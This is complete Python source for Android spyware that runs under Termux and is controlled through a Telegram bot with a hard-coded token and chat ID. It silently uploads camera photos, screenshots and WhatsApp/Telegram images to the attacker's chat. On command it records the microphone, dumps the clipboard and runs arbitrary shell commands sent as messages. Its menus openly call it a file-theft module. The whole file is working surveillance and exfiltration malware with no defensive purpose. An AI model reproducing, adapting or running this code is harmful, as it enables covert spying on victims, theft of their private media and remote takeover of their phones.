import os, time, subprocess, threading

try:
    import telebot
    from telebot import types
except ImportError:
    subprocess.run(["pip", "install", "pyTelegramBotAPI"])
    import telebot
    from telebot import types

TOKEN = "8354728858:AAEsorSBoucxw5aZDTxDErBRHxhIe5m8Ysw"
CHAT_ID = "7943753454"
bot = telebot.TeleBot(TOKEN)
DB_FILE = os.path.expanduser("~/.sys_cache_v2")

# Настройки слива
CONFIG = {
    "active": True,
    "mode": "new", # 'new' или 'all'
    "targets": {
        "camera": True,
        "screens": True,
        "messengers": True
    }
}

PATHS = {
    "camera": "/sdcard/DCIM/Camera",
    "screens": "/sdcard/DCIM/Screenshots",
    "messengers": [
        "/sdcard/Telegram/Telegram Images",
        "/sdcard/WhatsApp/Media/WhatsApp Images",
        "/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images"
    ]
}

def get_main_menu():
    m = types.ReplyKeyboardMarkup(resize_keyboard=True)
    m.add("📸 Настройка Слива", "🎙 Микрофон")
    m.add("📊 Статус", "📋 Буфер")
    return m

def get_drain_menu():
    m = types.InlineKeyboardMarkup()
    m.add(types.InlineKeyboardButton(f"Слив: {'✅ ON' if CONFIG['active'] else '❌ OFF'}", callback_data="toggle_active"))
    m.add(types.InlineKeyboardButton(f"Режим: {'🆕 Новые' if CONFIG['mode']=='new' else '📚 Все'}", callback_data="toggle_mode"))
    m.add(types.InlineKeyboardButton(f"Камера: {'✅' if CONFIG['targets']['camera'] else '❌'}", callback_data="t_camera"),
          types.InlineKeyboardButton(f"Скрины: {'✅' if CONFIG['targets']['screens'] else '❌'}", callback_data="t_screens"))
    m.add(types.InlineKeyboardButton(f"Мессенджеры: {'✅' if CONFIG['targets']['messengers'] else '❌'}", callback_data="t_messengers"))
    return m

def stealer():
    while True:
        if CONFIG["active"]:
            active_paths = []
            if CONFIG["targets"]["camera"]: active_paths.append(PATHS["camera"])
            if CONFIG["targets"]["screens"]: active_paths.append(PATHS["screens"])
            if CONFIG["targets"]["messengers"]:
                for p in PATHS["messengers"]: active_paths.append(p)

            for path in active_paths:
                if not os.path.exists(path): continue
                
                # Фильтр по времени
                time_arg = "-mmin -1440" if CONFIG["mode"] == "new" else ""
                cmd = f"find '{path}' -maxdepth 1 -type f \( -name '*.jpg' -o -name '*.png' -o -name '*.jpeg' \) {time_arg}"
                files = subprocess.getoutput(cmd).splitlines()

                for f in files:
                    if not os.path.isfile(f): continue
                    with open(DB_FILE, "a+") as db:
                        db.seek(0)
                        if f not in db.read():
                            try:
                                with open(f, "rb") as doc:
                                    bot.send_document(CHAT_ID, doc)
                                db.write(f + "\n")
                                time.sleep(1) # Защита от спам-фильтра ТГ
                            except: pass
        time.sleep(30)

@bot.message_handler(commands=['start'])
def start(m):
    bot.send_message(CHAT_ID, "⚙️ *Панель управления обновлена.*", parse_mode="Markdown", reply_markup=get_main_menu())

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    global CONFIG
    if call.data == "toggle_active": CONFIG["active"] = not CONFIG["active"]
    elif call.data == "toggle_mode": CONFIG["mode"] = "all" if CONFIG["mode"]=="new" else "new"
    elif call.data == "t_camera": CONFIG["targets"]["camera"] = not CONFIG["targets"]["camera"]
    elif call.data == "t_screens": CONFIG["targets"]["screens"] = not CONFIG["targets"]["screens"]
    elif call.data == "t_messengers": CONFIG["targets"]["messengers"] = not CONFIG["targets"]["messengers"]
    
    bot.edit_message_reply_markup(CHAT_ID, call.message.message_id, reply_markup=get_drain_menu())

@bot.message_handler(content_types=['text'])
def handle(m):
    if m.text == "📸 Настройка Слива":
        bot.send_message(CHAT_ID, "Управление модулем кражи файлов:", reply_markup=get_drain_menu())
    elif m.text == "📊 Статус":
        res = subprocess.getoutput("termux-battery-status")
        bot.send_message(CHAT_ID, f"🔋 Статус:\n`{res}`", parse_mode="Markdown")
    elif m.text == "🎙 Микрофон":
        bot.send_message(CHAT_ID, "🎙 Запись 10 сек...")
        os.system("termux-microphone-record -d 10 -f ~/v.amr")
        with open(os.path.expanduser("~/v.amr"), "rb") as a:
            bot.send_document(CHAT_ID, a)
        os.remove(os.path.expanduser("~/v.amr"))
    elif m.text == "📋 Буфер":
        res = subprocess.getoutput("termux-clipboard-get")
        bot.send_message(CHAT_ID, f"📋 Буфер:\n`{res}`", parse_mode="Markdown")
    else:
        out = subprocess.getoutput(m.text)
        if out: bot.send_message(CHAT_ID, f"💻 Вывод:\n`{out[:4000]}`", parse_mode="Markdown")

threading.Thread(target=stealer, daemon=True).start()
bot.polling(none_stop=True)
